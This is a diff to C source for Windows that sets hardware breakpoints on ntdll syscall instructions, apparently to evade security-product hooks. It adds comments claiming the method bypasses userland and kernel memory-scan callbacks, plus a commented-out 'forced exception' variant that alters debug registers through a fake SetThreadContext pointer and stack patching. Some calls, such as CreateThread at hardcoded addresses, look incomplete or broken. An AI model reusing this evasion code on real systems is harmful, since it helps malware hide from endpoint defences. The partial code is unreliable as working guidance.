@@ -210,7 +210,7 @@ BOOL FindSyscallInstruction(LPVOID nt_func_addr, LPVOID* syscall_addr, LPVOID* s
 BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle) {
     LPVOID syscall_addr, syscall_ret_addr;
     CONTEXT thread_context = { 0 };
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    // HMODULE ntdll = GetModuleHandleA("ntdll.dll");
 
     if (!FindSyscallInstruction(nt_func_addr, &syscall_addr, &syscall_ret_addr)) {
         return FALSE;
@@ -258,7 +258,8 @@ NtSetContextThread_t pNtSetContextThread = NULL;
 
 
 // a separate thread for calling SetResumeThread so we can set hardware breakpoints
-//This function can be any function you would like to use as decoy to cause the exception.
+//This function can be any function you would like to use as decoy and trigger to cause the exception. 
+// This function can even be a trampoline code...
 DWORD SetResumeThread(LPVOID param) {
 
     HANDLE hThreadd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)0x7FF7A2A7, NULL, CREATE_SUSPENDED, NULL);
@@ -293,7 +294,7 @@ DWORD SetResumeThread(LPVOID param) {
 
 LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e);
 
-// //Method 1: 
+// //Method 1 can bypass both userland and kernel callback on memory scans: 
 BOOL BypassHookUsingBreakpoints() {
 	// set an exception handler to handle hardware breakpoints
 	SetUnhandledExceptionFilter(BreakpointHandler);
@@ -318,6 +319,54 @@ BOOL BypassHookUsingBreakpoints() {
 
 	return TRUE;
 }
+
+/// TODO: Forced execution to change the debug registers Dr0, Dr1 and Dr7 in thread context without use SetThreadContext
+
+// exception handler for forced exception
+// LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS e)
+// {
+// 	static CONTEXT fake_context = { 0 };
+
+// 	printf("Exception handler triggered at address: 0x%llx\n", (DWORD64)
+// 		   e->ExceptionRecord->ExceptionAddress);
+	
+// 	DWORD64* stack_ptr = (DWORD64*)e->ContextRecord->Rsp;
+	
+// 	// iterate first 300 stack variables looking for our fake address
+// 	for (int i = 0; i < 300; i++) {
+// 		if (*stack_ptr == 0x1337) {
+// 			// replace the fake address with the real one
+// 			*stack_ptr = (DWORD64)g_thread_context;
+
+// 			printf("Fixed stack value at RSP+(0x8*0x%x) (0x%llx): 0x%llx\n", 
+// 				   i, (DWORD64)stack_ptr, (DWORD64)*stack_ptr);
+// 		}
+// 		stack_ptr++;
+// 	}
+
+// 	e->ContextRecord->Rbx = (DWORD64)&fake_context;
+
+// 	return EXCEPTION_CONTINUE_EXECUTION;
+// }
+
+// BOOL BypassHookUsingForcedException() {
+// 	// set an exception handler to handle hardware breakpoints
+// 	SetUnhandledExceptionFilter(ExceptionHandler);
+
+// 	// call SetThreadContext with an invalid address to trigger exception
+// 	if (!SetThreadContext(g_thread_handle, (CONTEXT*)0x1337)) {
+// 		printf("SetThreadContext() failed, error: %d\n", GetLastError());
+// 	}
+
+//     if(!CreateThread(NULL, 0, 0x88888, NULL, CREATE_SUSPENDED, NULL)) {
+//         printf("[-] CreateThread() failed, error: %d\n", GetLastError());
+//         return FALSE;
+//     }
+
+// 	return TRUE;
+// }
+// exception handler for forced exception
+
 
 ////////////////////////// Breakpoint test end
 
